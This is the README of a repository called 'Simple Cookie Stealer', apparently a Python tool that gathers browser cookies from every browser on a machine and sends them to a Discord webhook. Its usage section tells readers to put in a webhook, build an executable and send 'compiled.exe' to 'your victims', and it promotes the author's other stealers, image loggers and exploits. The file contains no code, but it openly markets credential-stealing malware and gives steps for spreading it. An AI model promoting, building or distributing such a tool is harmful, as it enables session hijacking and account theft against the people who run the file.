# 🍪 Simple Cookie Stealer

**Simple Cookie Stealer** is probably both the most basic and best Cookie Stealer out there. <br>
It is not bloated with flashy embeds, images, or features. Instead, it strives to be extremely fast and small, and steal from all browsers.

If you're struggling, the [Video Tutorial](https://youtu.be/iSMlgeEVqvE) may help.

# 💎 Features

* One Clean Test File (No Webhook Spams)
* Crawls For Browsers (So it steals from truly **every** browser)
* Simple and Fast, takes no more than 2 seconds to finish.

# 🛠️ Usage

Usage is extremely simple! <br>

* **1)** Firstly, make sure Python is installed. [Click Here](https://www.python.org/downloads/) to install! **NOTE:** Make sure to check "Add Python to PATH" when installing! <br>
* **2)** Get a Discord Webhook and put it in the file. On line one where it says `webhook = ""` input your webhook between the quotes. <br>
* **3)** Run `build.py`, enter your webhook, and send the "compiled.exe" file to your victims! 😈 <br>

# 🌠 Closing Statements

Thank you for using my tools! If this helps, **star!**

You can also try my other tools! Check out my repositories for other stealers, image loggers, exploits, and more! <br>
Enjoy your day :)
